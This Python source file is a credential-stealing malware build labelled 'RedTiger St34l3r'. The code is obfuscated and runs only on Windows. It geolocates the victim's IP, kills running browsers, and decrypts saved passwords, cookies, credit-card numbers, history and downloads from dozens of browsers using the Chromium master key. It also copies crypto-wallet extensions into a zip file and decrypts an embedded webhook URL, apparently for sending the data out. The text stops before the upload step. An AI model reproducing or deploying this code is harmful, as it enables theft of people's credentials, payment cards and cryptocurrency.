
import sys

def D3f_V3rific4ti0n():
    def D3f_On1yW1nd0w5():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        v4r_status = D3f_On1yW1nd0w5()
        if v4r_status == True:
            return v4r_status
    except:
        return True
    
if D3f_V3rific4ti0n() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def D3f_Sy5t3mInf0(v4r_zip_file): 
    v4r_status_system_info = None
    return v4r_status_system_info

def D3f_R0b10xAccount(v4r_zip_file):
    v4r_number_roblox_account = None
    return v4r_number_roblox_account

def D3f_Di5c0rdAccount(v4r_zip_file):
    v4r_number_discord_account = None
    return v4r_number_discord_account

def D3f_Di5c0rdInj3c710n(): 
    v4r_number_discord_injection = None
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file): 
    v4r_number_extentions = None
    v4r_number_passwords = None
    v4r_number_cookies = None
    v4r_number_history = None
    v4r_number_downloads = None
    v4r_number_cards = None
    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_S3ssi0nFil3s(v4r_zip_file):
    v4r_name_wallets = None
    v4r_name_game_launchers = None
    v4r_name_apps = None
    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Int3r3stingFil3s(v4r_zip_file):
    v4r_number_files = None
    return v4r_number_files

def D3f_W3bc4m(v4r_zip_file):
    v4r_status_camera_capture = None
    return v4r_status_camera_capture

def D3f_Scr33n5h0t(v4r_zip_file): 
    v4r_number_screenshot = None
    return v4r_number_screenshot

def D3f_St4rtup(): pass
def D3f_R3st4rt(): pass
def D3f_B10ckK3y(): pass
def D3f_Unb10ckK3y(): pass
def D3f_B10ckT45kM4n4g3r(): pass
def D3f_B10ckM0u53(): pass
def D3f_B10ckW3b5it3(): pass
def D3f_F4k33rr0r(): pass
def D3f_Sp4m0p3nPr0gr4m(): pass
def D3f_Sp4mCr34tFil3(): pass
def D3f_Shutd0wn(): pass
def D3f_Sp4m_Opti0ns(): pass

def D3f_Title(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def D3f_Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def D3f_Decrypt(v4r_encrypted, v4r_key):
    def D3f_DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = D3f_DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

D3f_Title("")

try: v4r_hostname_pc    = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc    = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc    = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

v4r_w3bh00k_ur1_crypt = r"""
FX2R0GaOxihhlvFrIFTVEhmQl5A+92V5CBSzyHTgZHWEr4qN3PuKCj+ip9R5aFyDkM68RwMymL/WaU+5oIVjYSrillf0oUfU6IkIQB8Gh3YslEXNa1ZHa1rw8RnJztpJJ7N8hUOwIb9yJcf5EJ6UtL5buhk5RjFCJ8DR8ba7IYGhhS0aJZztVSQGKT2Am5unR7f3X4QGxTkKNvCXw36L0w==
"""

v4r_k3y            = "fohPEFEDYZkEQXjvJWBGojIhIifmNtEzvwmDpnjobFXowrYdxOTsbdjqqRPKdGpGLFhzYXqoMxghsgDYKBjnHnwtHKxQAZJsydnEGGTMTCjuyiPmFpShBxCeGdyXKZfjSeybfPaqcYBpsfBfNdyqXvSFsLWVFpiNPsCqGPSNycAqIgtgHAuXSqywF"
v4r_website        = "None"
v4r_color_embed    = 0xa80505
v4r_username_embed = "RedTiger St34l3r"
v4r_avatar_embed   = "https://google.com"
v4r_footer_text    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

v4r_path_windows           = os.getenv("WINDIR", None)
v4r_path_userprofile       = os.getenv('USERPROFILE', None)
v4r_path_appdata_local     = os.getenv('LOCALAPPDATA', None)
v4r_path_appdata_roaming   = os.getenv('APPDATA', None)
v4r_path_program_files_x86 = os.getenv('ProgramFiles(x86)', None)
if v4r_path_program_files_x86 is None:
    v4r_path_program_files_x86 = os.getenv('ProgramFiles', None)

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")

def D3f_Br0w53r5t341(v4r_zip_file):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

    v4r_browser_choice = ["history", "downloads"]
    v4r_browsers = []

    if "extentions" in v4r_browser_choice:
        v4r_number_extentions = 0
    else:
        v4r_number_extentions = None

    if "passwords" in v4r_browser_choice:
        v4r_file_passwords = []
        v4r_number_passwords = 0
    else:
        v4r_file_passwords = ""
        v4r_number_passwords = None
    if "cookies" in v4r_browser_choice:
        v4r_file_cookies = []
        v4r_number_cookies = 0
    else:
        v4r_file_cookies = ""
        v4r_number_cookies = None
    if "history" in v4r_browser_choice:
        v4r_file_history = []
        v4r_number_history = 0
    else:
        v4r_file_history = ""
        v4r_number_history = None
    if "downloads" in v4r_browser_choice:
        v4r_file_downloads = []
        v4r_number_downloads = 0
    else:
        v4r_file_downloads = ""
        v4r_number_downloads = None
    if "cards" in v4r_browser_choice:
        v4r_file_cards = []
        v4r_number_cards = 0
    else:
        v4r_file_cards = ""
        v4r_number_cards = None
    
    def D3f_GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None

        try:
            with open(v4r_path, 'r', encoding='utf-8') as v4r_f:
                v4r_local_state = json.load(v4r_f)

            v4r_encrypted_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
            v4r_master_key = win32crypt.CryptUnprotectData(v4r_encrypted_key, None, None, None, 0)[1]
            return v4r_master_key
        except:
            return None

    def D3f_Decrypt(v4r_buff, v4r_master_key):
        try:
            v4r_iv = v4r_buff[3:15]
            v4r_payload = v4r_buff[15:-16]
            v4r_tag = v4r_buff[-16:]
            v4r_cipher = Cipher(algorithms.AES(v4r_master_key), modes.GCM(v4r_iv, v4r_tag))
            v4r_decryptor = v4r_cipher.decryptor()
            v4r_decrypted_pass = v4r_decryptor.update(v4r_payload) + v4r_decryptor.finalize()
            return v4r_decrypted_pass.decode()
        except:
            return None
        
    def D3f_GetPasswords(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_passwords
        v4r_password_db = os.path.join(v4r_profile_path, 'Login Data')
        if not os.path.exists(v4r_password_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_password_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url      : {v4r_row[0]}"
            v4r_username =     f"  Username : {v4r_row[1]}"
            v4r_password =     f"  Password : {D3f_Decrypt(v4r_row[2], v4r_master_key)}"
            v4r_browser_name = f"  Browser  : {v4r_browser}"
            v4r_file_passwords.append(f"{v4r_url}\n{v4r_username}\n{v4r_password}\n{v4r_browser_name}\n")
            v4r_number_passwords += 1

        v4r_conn.close()

    def D3f_GetCookies(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cookies
        v4r_cookie_db = os.path.join(v4r_profile_path, 'Network', 'Cookies')
        if not os.path.exists(v4r_cookie_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cookie_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_name =         f"  Name    : {v4r_row[1]}"
            v4r_path =         f"  Path    : {v4r_row[2]}"
            v4r_cookie =       f"  Cookie  : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_expire =       f"  Expire  : {v4r_row[4]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_cookies.append(f"{v4r_url}\n{v4r_name}\n{v4r_path}\n{v4r_cookie}\n{v4r_expire}\n{v4r_browser_name}\n")
            v4r_number_cookies += 1

        v4r_conn.close()

    def D3f_GetHistory(v4r_browser, v4r_profile_path):
        global v4r_number_history
        v4r_history_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_history_db):
            return
        
        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_history_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_title =        f"  Title   : {v4r_row[1]}"
            v4r_time =         f"  Time    : {v4r_row[2]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_history.append(f"{v4r_url}\n{v4r_title}\n{v4r_time}\n{v4r_browser_name}\n")
            v4r_number_history += 1

        v4r_conn.close()
    
    def D3f_GetDownloads(v4r_browser, v4r_profile_path):
        global v4r_number_downloads
        v4r_downloads_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_downloads_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_downloads_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in v4r_cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            v4r_path =         f"- Path    : {row[1]}"
            v4r_url =          f"  Url     : {row[0]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_downloads.append(f"{v4r_path}\n{v4r_url}\n{v4r_browser_name}\n")
            v4r_number_downloads += 1

        v4r_conn.close()
    
    def D3f_GetCards(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cards
        v4r_cards_db = os.path.join(v4r_profile_path, 'Web Data')
        if not os.path.exists(v4r_cards_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cards_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_name =             f"- Name             : {v4r_row[0]}"
            v4r_expiration_month = f"  Expiration Month : {v4r_row[1]}"
            v4r_expiration_year =  f"  Expiration Year  : {v4r_row[2]}"
            v4r_card_number =      f"  Card Number      : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_date_modified =    f"  Date Modified    : {v4r_row[4]}"
            v4r_browser_name =     f"  Browser          : {v4r_browser}"
            v4r_file_cards.append(f"{v4r_name}\n{v4r_expiration_month}\n{v4r_expiration_year}\n{v4r_card_number}\n{v4r_date_modified}\n{v4r_browser_name}\n")
            v4r_number_cards += 1
        
        v4r_conn.close()

    def D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_browser, v4r_profile_path):
        global v4r_number_extentions
        v4r_extensions_path = os.path.join(v4r_profile_path, 'Extensions')
        v4r_zip_folder = os.path.join("Extensions", v4r_browser)

        if not os.path.exists(v4r_extensions_path):
            return 

        v4r_extentions = [v4r_item for v4r_item in os.listdir(v4r_extensions_path) if os.path.isdir(os.path.join(v4r_extensions_path, v4r_item))]
        
        for v4r_extention in v4r_extentions:
            if "Temp" in v4r_extention:
                continue
            
            v4r_number_extentions += 1
            v4r_extension_found = False
            
            for v4r_extension_name, v4r_extension_folder in v4r_extensions_names:
                if v4r_extention == v4r_extension_folder:
                    v4r_extension_found = True
                    
                    v4r_extension_folder_path = os.path.join(v4r_zip_folder, v4r_extension_name, v4r_extention)
                    
                    v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                    for v4r_item in os.listdir(v4r_source_extension_path):
                        v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                        
                        if os.path.isdir(v4r_item_path):
                            for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                    v4r_zip_file.write(file_path, os.path.join(v4r_extension_folder_path, arcname))
                        else:
                            v4r_zip_file.write(v4r_item_path, os.path.join(v4r_extension_folder_path, v4r_item))
                    break

            if not v4r_extension_found:
                v4r_other_folder_path = os.path.join(v4r_zip_folder, "Unknown Extension", v4r_extention)
                
                v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                for v4r_item in os.listdir(v4r_source_extension_path):
                    v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                    
                    if os.path.isdir(v4r_item_path):
                        for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                v4r_zip_file.write(file_path, os.path.join(v4r_other_folder_path, arcname))
                    else:
                        v4r_zip_file.write(v4r_item_path, os.path.join(v4r_other_folder_path, v4r_item))

    v4r_browser_files = [
        ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(v4r_path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(v4r_path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    v4r_profiles = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    v4r_extensions_names = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
        if not os.path.exists(v4r_path):
            continue

        v4r_master_key = D3f_GetMasterKey(os.path.join(v4r_path, 'Local State'))
        if not v4r_master_key:
            continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue
            
            if "extentions" in v4r_browser_choice:
                try: D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_name, v4r_profile_path)
                except: pass
                
            if "passwords" in v4r_browser_choice:
                try: D3f_GetPasswords(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "cookies" in v4r_browser_choice:
                try: D3f_GetCookies(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "history" in v4r_browser_choice:
                try: D3f_GetHistory(v4r_name, v4r_profile_path)
                except: pass
            if "downloads" in v4r_browser_choice:
                try: D3f_GetDownloads(v4r_name, v4r_profile_path)
                except: pass
            if "cards" in v4r_browser_choice:
                try: D3f_GetCards(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass

            if v4r_name not in v4r_browsers:
                v4r_browsers.append(v4r_name)

    if "passwords" in v4r_browser_choice:
        if not v4r_file_passwords:
            v4r_file_passwords.append("No passwords was saved on the victim's computer.")
        v4r_file_passwords = "\n".join(v4r_file_passwords)
    if "cookies" in v4r_browser_choice:
        if not v4r_file_cookies:
            v4r_file_cookies.append("No cookies was saved on the victim's computer.")
        v4r_file_cookies   = "\n".join(v4r_file_cookies)
    if "history" in v4r_browser_choice:
        if not v4r_file_history:
            v4r_file_history.append("No history was saved on the victim's computer.")
        v4r_file_history   = "\n".join(v4r_file_history)
    if "downloads" in v4r_browser_choice:
        if not v4r_file_downloads:
            v4r_file_downloads.append("No downloads was saved on the victim's computer.")
        v4r_file_downloads = "\n".join(v4r_file_downloads)
    if "cards" in v4r_browser_choice:
        if not v4r_file_cards:
            v4r_file_cards.append("No cards was saved on the victim's computer.")
        v4r_file_cards     = "\n".join(v4r_file_cards)
    
    if v4r_number_passwords != None:
        v4r_zip_file.writestr(f"Passwords ({v4r_number_passwords}).txt", v4r_file_passwords)

    if v4r_number_cookies != None:
        v4r_zip_file.writestr(f"Cookies ({v4r_number_cookies}).txt", v4r_file_cookies)

    if v4r_number_cards != None:
        v4r_zip_file.writestr(f"Cards ({v4r_number_cards}).txt", v4r_file_cards)

    if v4r_number_history != None:
        v4r_zip_file.writestr(f"Browsing History ({v4r_number_history}).txt", v4r_file_history)

    if v4r_number_downloads != None:
        v4r_zip_file.writestr(f"Download History ({v4r_number_downloads}).txt",v4r_file_downloads)

    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

v4r_option = []

v4r_zip_buffer = io.BytesIO()
with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

    try: 
        v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
    except Exception as e:
        v4r_number_discord_injection = f"Error: {e}"

    try: 
        v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
    except Exception as e:
        v4r_status_system_info = f"Error: {e}"

    try: 
        v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_discord_account = f"Error: {e}"

    try: 
        v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
    except Exception as e:
        v4r_number_extentions = f"Error: {e}"
        v4r_number_passwords = f"Error: {e}"
        v4r_number_cookies = f"Error: {e}"
        v4r_number_history = f"Error: {e}"
        v4r_number_downloads = f"Error: {e}"
        v4r_number_cards = f"Error: {e}"

    try: 
        v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_roblox_account = f"Error: {e}"

    try: 
        v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"

    try: 
        v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
    except Exception as e:
        v4r_number_files = f"Error: {e}"

    if v4r_number_discord_injection != None:
        v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

    if v4r_status_camera_capture != None:
        v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

    if v4r_status_screenshot != None:
        v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

    if v4r_status_system_info != None:
        v4r_option.append(f"System Info       : {v4r_status_system_info}")

    if v4r_number_discord_account != None:
        v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

    if v4r_number_roblox_account != None:
        v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

    if v4r_number_passwords != None:
        v4r_option.append(f"Passwords         : {v4r_number_passwords}")

    if v4r_number_cookies != None:
